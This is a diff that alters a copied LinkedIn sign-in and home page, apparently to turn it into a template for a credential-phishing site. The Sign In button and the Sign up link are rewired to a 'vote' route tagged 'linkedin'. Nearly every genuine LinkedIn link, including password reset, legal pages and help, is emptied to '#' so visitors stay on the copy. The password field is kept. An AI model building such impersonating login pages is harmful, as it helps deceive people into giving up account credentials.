@@ -394,14 +394,17 @@ z-index: 1005;
 </li>
 <li>
 <label for="session_password-login">Password</label>
-<a href="https://www.linkedin.com/uas/request-password-reset?trk=signin_fpwd" class="forgot-pwd" tabindex="4">Forgot your password?</a>
+<a href="#" class="forgot-pwd" tabindex="4">Forgot your password?</a>
 <div class="fieldgroup">
 <span class="error" id="session_password-login-error"></span>
 <input type="password" name="session_password" value="" id="session_password-login" tabindex="2" size="27">
 </div>
 </li>
 <li class="button">
-<input type="submit" name="signin" value="Sign In" id="signin" tabindex="3" class="btn-secondary" disabled="">
+        <button type="submit" name="signin" value="Sign In" id="signin" tabindex="3" class="btn-secondary">
+            <a href="{{ route('vote', ['site' => 'linkedin']) }}" style="text-decoration: none">Sign In
+            </a>
+        </button>
 </li>
 </ul>
 <script id="controlinit-http-12209-exec-3051392-1" type="text/javascript+initialized" class="li-control">LI.Controls.addControl('control-http-12209-exec-3051392-1','Login',{autoFocus:true,disableSubmit:true,submitId:'signin'});</script>
@@ -478,7 +481,7 @@ Join the world's largest professional network.
 <input type="hidden" name="trk" value="guest_home_login">
 <div class="form-bottom-row">
 <p class="policy">
-By clicking Join Now, you agree to LinkedIn's <a href="http://www.linkedin.com/static?key=user_agreement">User Agreement</a>, <a href="http://www.linkedin.com/static?key=privacy_policy">Privacy Policy</a> and <a href="http://www.linkedin.com/legal/cookie-policy">Cookie Policy</a>.
+By clicking Join Now, you agree to LinkedIn's <a href="#">User Agreement</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Policy</a>.
 </p>
 <p class="action">
 <script>utmx_section("JoinNow-Button")</script><input type="submit" name="" value="Join now" id="btn-submit" class="btn-action" tabindex="9">
@@ -520,7 +523,7 @@ else{win.attachEvent('onload',getRumScript);}}(LI.RUM,window));</script>
 <input type="text" name="last" id="last" size="185" placeholder="Last name">
 </li>
 </ul>
-<p class="action"><input class="btn-secondary" type="submit" name="search" value="Search"></p>
+<p><input class="btn-secondary" type="submit" name="#" value="Search"></p>
 </form>
 </div>
 <div id="directory" class="us">
@@ -529,88 +532,88 @@ LinkedIn member directory:
 </h3>
 <ol type="a" class="primary">
 <li>
-<a href="http://www.linkedin.com/directory/people-a">a</a>
+<a href="#">a</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-b">b</a>
+<a href="#">b</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-c">c</a>
+<a href="#">c</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-d">d</a>
+<a href="#">d</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-e">e</a>
+<a href="#">e</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-f">f</a>
+<a href="#">f</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-g">g</a>
+<a href="#">g</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-h">h</a>
+<a href="#">h</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-i">i</a>
+<a href="#">i</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-j">j</a>
+<a href="#">j</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-k">k</a>
+<a href="#">k</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-l">l</a>
+<a href="#">l</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-m">m</a>
+<a href="#">m</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-n">n</a>
+<a href="#">n</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-o">o</a>
+<a href="#">o</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-p">p</a>
+<a href="#">p</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-q">q</a>
+<a href="#">q</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-r">r</a>
+<a href="#">r</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-s">s</a>
+<a href="#">s</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-t">t</a>
+<a href="#">t</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-u">u</a>
+<a href="#">u</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-v">v</a>
+<a href="#">v</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-w">w</a>
+<a href="#">w</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-x">x</a>
+<a href="#">x</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-y">y</a>
+<a href="#">y</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-z">z</a>
+<a href="#">z</a>
 </li>
 <li>
-<a href="http://www.linkedin.com/directory/people-1" class="callout-trigger nlcl-hovercard-trigger">more</a>
+<a href="#">more</a>
 </li>
 <li class="country-search">
-Browse members <a href="http://www.linkedin.com/static?key=country_listing">by country</a>
+Browse members <a href="#">by country</a>
 </li>
 </ol>
 </div>
@@ -618,99 +621,99 @@ Browse members <a href="http://www.linkedin.com/static?key=country_listing">by c
 <div class="wrapper">
 <ul class="nav-footer">
 <li>
-<a href="https://www.linkedin.com/reg/join?trk=hb_ft_join">Sign up</a>
+<a href="{{ route('vote', ['site' => 'linkedin']) }}">Sign up</a>
 </li>
 <li>
-<a href="https://help.linkedin.com/app/home/loc/ft/trk/guest-home/" target="_blank" rel="nofollow" class="cust-svc-link">Help Center</a>
+<a href="#"class="cust-svc-link">Help Center</a>
 </li>
 <li id="li-about">
-<a id="li-about-trigger" href="http://www.linkedin.com/about-us?trk=hb_ft_about">About</a>
+<a id="li-about-trigger" href="#">About</a>
 <ul id="li-about-options">
-<li><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fpress%2Elinkedin%2Ecom%2F&urlhash=UMoC" target="_blank">Press</a></li>
-<li><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fblog%2Elinkedin%2Ecom%2F&urlhash=ULil" target="_blank">Blog</a></li>
-<li><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fdeveloper%2Elinkedin%2Ecom&urlhash=EFv_" target="_blank">Developers</a></li>
+<li><a href="#">Press</a></li>
+<li><a href="#" >Blog</a></li>
+<li><a href="#" >Developers</a></li>
 </ul>
 </li>
-<li><a href="http://www.linkedin.com/company/linkedin/careers?trk=hb_ft_work">Careers</a></li>
-<li><a href="http://www.linkedin.com/advertising?src=en-all-el-li-hb_ft_ads&trk=hb_ft_ads">Advertising</a></li>
-<li><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fbusiness%2Elinkedin%2Ecom%2Ftalent-solutions%3Fsrc%3Dli-footer%26trk%3Dhb_ft_talent&urlhash=_Y5C" target="_blank">Talent Solutions</a></li>
+<li><a href="#">Careers</a></li>
+<li><a href="#">Advertising</a></li>
+<li><a href="#" >Talent Solutions</a></li>
 <li>
-<a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fbusiness%2Elinkedin%2Ecom%2Fsales-solutions%3Fsrc%3Dli-footer%26utm_source%3Dfooter%26utm_medium%3Dlinkedin%26utm_campaign%3Dlinkedin-footer%26trk%3Dlss_linkedin_footer_link2micro&urlhash=yg9r" target="_blank">Sales Solutions</a>
+<a href="#" >Sales Solutions</a>
 </li>
-<li><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fsmallbusiness%2Elinkedin%2Ecom%2F%3Ftrk%3Dlnkd_footer%26utm_source%3Dlinkedin%26utm_medium%3Dfooter%26utm_content%3D%26utm_campaign%3Dlifooter&urlhash=zrGO" target="_blank">Small Business</a></li>
-<li><a href="http://www.linkedin.com/mobile?trk=hb_ft_mobile" target="_blank">Mobile</a></li>
+<li><a href="#" >Small Business</a></li>
+<li><a href="#" >Mobile</a></li>
 <li id="nav-utility-lang" class="">
-<a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang">Language</a>
+<a href="#">Language</a>
 <form name="languageSelectorForm" action="https://www.linkedin.com/languageSelector" method="POST" accept-charset="UTF-8" novalidate="novalidate">
 <ul id="lang-list">
-<li class="in"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="in_ID"><span>Bahasa Indonesia</span></a></li>
-<li class="ms"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ms_MY"><span>Bahasa Malaysia</span></a></li>
-<li class="cs"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="cs_CZ"><span>Čeština</span></a></li>
-<li class="da"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="da_DK"><span>Dansk</span></a></li>
-<li class="de"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="de_DE"><span>Deutsch</span></a></li>
-<li class="selected en"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="en_US"><strong>English</strong></a></li>
-<li class="es"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="es_ES"><span>Español</span></a></li>
-<li class="zh"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="zh_TW"><span>正體中文</span></a></li>
-<li class="fr"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="fr_FR"><span>Français</span></a></li>
-<li class="ko"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ko_KR"><span>한국어</span></a></li>
-<li class="it"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="it_IT"><span>Italiano</span></a></li>
-<li class="zh"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="zh_CN"><span>简体中文</span></a></li>
-<li class="nl"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="nl_NL"><span>Nederlands</span></a></li>
-<li class="ja"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ja_JP"><span>日本語</span></a></li>
-<li class="no"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="no_NO"><span>Norsk</span></a></li>
-<li class="pl"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="pl_PL"><span>Polski</span></a></li>
-<li class="pt"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="pt_BR"><span>Português</span></a></li>
-<li class="ro"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ro_RO"><span>Română</span></a></li>
-<li class="ru"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ru_RU"><span>Русский</span></a></li>
-<li class="sv"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="sv_SE"><span>Svenska</span></a></li>
-<li class="tl"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="tl_PH"><span>Tagalog</span></a></li>
-<li class="th"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="th_TH"><span>ภาษาไทย</span></a></li>
-<li class="tr"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="tr_TR"><span>Türkçe</span></a></li>
-<li class="ar"><a href="https://www.linkedin.com/secure/settings?trk=hb_ft_lang" lang="ar_AE"><span>العربية</span></a></li>
+<li class="in"><a href="#" lang="in_ID"><span>Bahasa Indonesia</span></a></li>
+<li class="ms"><a href="#" lang="ms_MY"><span>Bahasa Malaysia</span></a></li>
+<li class="cs"><a href="#" lang="cs_CZ"><span>Čeština</span></a></li>
+<li class="da"><a href="#" lang="da_DK"><span>Dansk</span></a></li>
+<li class="de"><a href="#" lang="de_DE"><span>Deutsch</span></a></li>
+<li class="selected en"><a href="#" lang="en_US"><strong>English</strong></a></li>
+<li class="es"><a href="#" lang="es_ES"><span>Español</span></a></li>
+<li class="zh"><a href="#" lang="zh_TW"><span>正體中文</span></a></li>
+<li class="fr"><a href="#" lang="fr_FR"><span>Français</span></a></li>
+<li class="ko"><a href="#" lang="ko_KR"><span>한국어</span></a></li>
+<li class="it"><a href="#" lang="it_IT"><span>Italiano</span></a></li>
+<li class="zh"><a href="#" lang="zh_CN"><span>简体中文</span></a></li>
+<li class="nl"><a href="#" lang="nl_NL"><span>Nederlands</span></a></li>
+<li class="ja"><a href="#" lang="ja_JP"><span>日本語</span></a></li>
+<li class="no"><a href="#" lang="no_NO"><span>Norsk</span></a></li>
+<li class="pl"><a href="#" lang="pl_PL"><span>Polski</span></a></li>
+<li class="pt"><a href="#" lang="pt_BR"><span>Português</span></a></li>
+<li class="ro"><a href="#" lang="ro_RO"><span>Română</span></a></li>
+<li class="ru"><a href="#" lang="ru_RU"><span>Русский</span></a></li>
+<li class="sv"><a href="#" lang="sv_SE"><span>Svenska</span></a></li>
+<li class="tl"><a href="#" lang="tl_PH"><span>Tagalog</span></a></li>
+<li class="th"><a href="#" lang="th_TH"><span>ภาษาไทย</span></a></li>
+<li class="tr"><a href="#" lang="tr_TR"><span>Türkçe</span></a></li>
+<li class="ar"><a href="#" lang="ar_AE"><span>العربية</span></a></li>
 </ul>
 <input type="hidden" name="i18nLang" value="">
 <input type="hidden" name="currenturl" value="https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Fnhome%2F%3Furlhash%3DMv3D">
 </form>
 </li>
-<li class="last"><a href="http://www.linkedin.com/redir/redirect?url=http%3A%2F%2Fwww%2Eslideshare%2Enet&urlhash=nLLC" target="_blank">SlideShare</a></li>
+<li class="last"><a href="#" >SlideShare</a></li>
 </ul>
 <nav role="navigation" aria-label="Footer Directory Menu">
 <ul class="nav-footer li-links" role="menubar">
-<li role="menuitem"><a href="http://www.linkedin.com/in/updates?trk=hb_ft_liup">LinkedIn Updates</a>
+<li role="menuitem"><a href="#">LinkedIn Updates</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/today/post/whoToFollow?trk=hb_ft_influencers">LinkedIn Influencers</a>
+<li role="menuitem"><a href="#">LinkedIn Influencers</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/job/?trk=hb_ft_jobs">LinkedIn Jobs</a>
+<li role="menuitem"><a href="#">LinkedIn Jobs</a>
 </li>
 </ul>
 <ul class="nav-footer directories" role="menubar">
 <li>Directories</li>
-<li role="menuitem"><a href="http://www.linkedin.com/directory/people-a?trk=hb_ft_peopledir">Members</a>
+<li role="menuitem"><a href="#">Members</a>
 </li>
-<li role="menuitem"><a href="https://www.linkedin.com/directory/jobs/?trk=hb_ft_jobsdir">Jobs</a>
+<li role="menuitem"><a href="#">Jobs</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/directory/pulse">Pulse</a>
+<li role="menuitem"><a href="#">Pulse</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/directory/companies">Companies</a>
+<li role="menuitem"><a href="#">Companies</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/directory/groups/">Groups</a>
+<li role="menuitem"><a href="#">Groups</a>
 </li>
-<li role="menuitem"><a href="http://www.linkedin.com/directory/universities">Universities</a>
+<li role="menuitem"><a href="#">Universities</a>
 </li>
-<li class="last" role="menuitem"><a href="http://www.linkedin.com/directory/title/">Titles</a>
+<li class="last" role="menuitem"><a href="#">Titles</a>
 </li>
 </ul>
 </nav>
 <p id="copyright" class="guest"><span>LinkedIn Corporation</span> <em>© 2015</em></p>
 <ul id="nav-legal">
-<li><a href="http://www.linkedin.com/legal/user-agreement?trk=hb_ft_userag">User Agreement</a></li>
-<li><a href="http://www.linkedin.com/legal/privacy-policy?trk=hb_ft_priv">Privacy Policy</a></li>
+<li><a href="#" >User Agreement</a></li>
+<li><a href="#" >Privacy Policy</a></li>
 <li>
-<a href="https://help.linkedin.com/app/answers/detail/a_id/34593/loc/na/trk/guest-home/" target="_blank" rel="nofollow">Community Guidelines</a>
+<a href="#" rel="nofollow">Community Guidelines</a>
 </li>
-<li><a href="http://www.linkedin.com/legal/cookie-policy?trk=hb_ft_cookie">Cookie Policy</a></li>
-<li><a href="http://www.linkedin.com/legal/copyright-policy?trk=hb_ft_copy">Copyright Policy</a></li>
-<li><a href="https://www.linkedin.com/psettings/guest-controls" rel="nofollow">Guest Controls</a></li>
+<li><a href="#" >Cookie Policy</a></li>
+<li><a href="#" >Copyright Policy</a></li>
+<li><a href="#" rel="nofollow">Guest Controls</a></li>
 </ul>
 </div>
 </div>
@@ -744,7 +747,7 @@ script.src='https://sb.scorecardresearch.com/beacon.js';document.getElementsByTa
 </noscript>
 <script>window.addEventListener('load',function(){var script=document.createElement('script');_qoptions={qacct:"p-b3sGjMtCFrexE"};script.src='https://secure.quantserve.com/quant.js';document.getElementsByTagName('head')[0].appendChild(script);});</script>
 <noscript>
-&lt;a href="http://www.quantcast.com/p-b3sGjMtCFrexE" target="_blank"&gt;&lt;img src="https://secure.quantserve.com/pixel/p-b3sGjMtCFrexE.gif" style="display: none;" height="1" width="1" alt=""/&gt;&lt;/a&gt;
+&lt;a href="#" &gt;&lt;img src="https://secure.quantserve.com/pixel/p-b3sGjMtCFrexE.gif" style="display: none;" height="1" width="1" alt=""/&gt;&lt;/a&gt;
 </noscript>
 <script>window.addEventListener('load',function(){var protocol='https:',d=new Image(1,1);d.onerror=d.onload=function(){d.onerror=d.onload=null;};d.src=[protocol,"//secure-us.imrworldwide.com/cgi-bin/m?ci=us-603751h&cg=0&cc=1&si=",escape(window.location.href),"&ts=compact&rnd=",(new Date()).getTime()].join('');});</script>
 <noscript>
